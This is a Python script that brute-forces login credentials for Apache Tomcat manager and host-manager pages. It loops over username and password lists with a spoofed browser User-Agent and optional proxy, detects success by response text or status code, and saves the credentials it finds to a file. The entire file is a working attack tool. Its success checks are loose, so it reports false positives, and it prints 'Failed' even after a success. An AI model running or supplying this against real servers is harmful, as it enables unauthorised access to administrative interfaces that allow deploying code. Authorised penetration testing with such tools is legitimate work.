#!/usr/bin/python

import requests
import argparse
import sys
import json  # Import JSON for parsing custom headers

# Set up command-line argument parsing
parser = argparse.ArgumentParser(description="Tomcat manager or host-manager credential bruteforcing")

# Dracula theme-like ANSI color codes
CYAN = '\033[96m'  # Bright Cyan for informational messages
GREEN = '\033[92m' # Bright Green for success messages
RED = '\033[91m'   # Bright Red for failure messages
RESET = '\033[0m'  # Reset to default terminal color

# Create valid passwords file. 
valid_passwords_file = 'bruteForcerValidPasswords.txt'

# Define command-line arguments
parser.add_argument("-U", "--url", type=str, required=True, help="URL to tomcat page")
parser.add_argument("-path", "--path", type=str, required=True, help="manager or host-manager URI")
parser.add_argument("-u", "--username", type=str, required=False, help="Single Username")
parser.add_argument("-p", "--password", type=str, required=False, help="Single Password")
parser.add_argument("-UF", "--usernames-file", type=str, required=False, help="Users File")
parser.add_argument("-PF", "--passwords-file", type=str, required=False, help="Passwords Files")
parser.add_argument("--proxy", type=str, required=False, help="Proxy address (e.g., http://127.0.0.1:8080)")
parser.add_argument("-m", "--method", type=str, choices=['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'HEAD'], required=True, help="HTTP Method")
parser.add_argument("-C", "--cookie", type=str, required=False, help="Cookie string (e.g., 'session=12345; token=abcd')")
parser.add_argument("-S", "--success-condition", type=str, required=False, help="Success condition (e.g., 'Welcome back')")
parser.add_argument("-F", "--failure-condition", type=str, required=False, help="Failure condition (e.g., 'Invalid credentials')")
parser.add_argument("-H", "--headers", type=json.loads, required=False, help="Custom headers in JSON format (e.g., '{\"X-Custom-Header\": \"value\"}')")

# Parse the arguments provided by the user
args = parser.parse_args()

# Assign the parsed arguments to variables
url = args.url
uri = args.path
username = args.username
password = args.password
users_file = args.usernames_file
passwords_file = args.passwords_file
proxy_address = args.proxy
method = args.method.upper()
cookie_string = args.cookie
success_condition = args.success_condition
failure_condition = args.failure_condition
custom_headers = args.headers

# Configure the proxy if provided
proxies = {}
if proxy_address:
    proxies = {"http": proxy_address, "https": proxy_address}

# Convert cookie string to a dictionary
cookies = {}
if cookie_string:
    cookie_items = cookie_string.split('; ')
    for item in cookie_items:
        key, value = item.split('=')
        cookies[key] = value

# Concatenate the URL and URI to form the complete endpoint for bruteforcing
new_url = url + uri

# Read and prepare usernames and passwords
usernames = []
passwords = []

if username:
    usernames.append(username.encode())
else:
    with open(users_file, "rb") as f_users:
        usernames = [x.strip() for x in f_users]

if password:
    passwords.append(password.encode())
else:
    with open(passwords_file, "rb") as f_pass:
        passwords = [x.strip() for x in f_pass]

total_attempts = len(usernames) * len(passwords)

print(f"{CYAN}\n[+] Attacking.....{RESET}")

attempt_count = 0

# Custom headers with an option to include user-provided custom headers
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'en-US,en;q=0.9',
    'Connection': 'close',
}

# Merge custom headers if provided
if custom_headers:
    headers.update(custom_headers)

for u in usernames:
    for p in passwords:
        attempt_count += 1
        message = f"\rAttempt {attempt_count} of {total_attempts}: Trying username '{u.decode()}' with password '{p.decode()}'\033[K"
        sys.stdout.write(message)
        sys.stdout.flush()

        data = {'username': u, 'password': p}  # Adjust data keys if necessary

        # Support for multiple HTTP methods
        if method == 'GET':
            response = requests.get(new_url, headers=headers, cookies=cookies, auth=(u, p), proxies=proxies)
        elif method == 'POST':
            response = requests.post(new_url, headers=headers, cookies=cookies, data=data, proxies=proxies)
        elif method == 'PUT':
            response = requests.put(new_url, headers=headers, cookies=cookies, data=data, proxies=proxies)
        elif method == 'DELETE':
            response = requests.delete(new_url, headers=headers, cookies=cookies, proxies=proxies)
        elif method == 'PATCH':
            response = requests.patch(new_url, headers=headers, cookies=cookies, data=data, proxies=proxies)
        elif method == 'HEAD':
            response = requests.head(new_url, headers=headers, cookies=cookies, proxies=proxies)

        # Improved success and failure detection logic
        if success_condition and success_condition.lower() in response.text.lower():
            success_message = f"{GREEN}\n[+] Success!!\n[+] Username: {u.decode()}\n[+] Password: {p.decode()}{RESET}"
            print(success_message)
            with open(valid_passwords_file, 'a') as file:  # Open file in append mode
                file.write(success_message + '\n')
        elif failure_condition and failure_condition.lower() not in response.text.lower():
            success_message = f"\n[+] Success!! (Failure condition not met)\n[+] Username: {u.decode()}\n[+] Password: {p.decode()}"
            print(success_message)
            with open(valid_passwords_file, 'a') as file:  # Open file in append mode
                file.write(success_message + '\n')
        elif response.status_code in [200, 302]:  # Check for common success status codes
            success_message = f"\n[+] Possible Success!! (Status code check)\n[+] Username: {u.decode()}\n[+] Password: {p.decode()}\n[+] Status Code: {response.status_code}"
            print(success_message)
            with open(valid_passwords_file, 'a') as file:  # Open file in append mode
                file.write(success_message + '\n')




# If script reaches this point, no successful login was found
failure_message = f"{RED}\n\n[+] Failed!!\n[+] Could not find valid credentials.{RESET}"
print(failure_message)
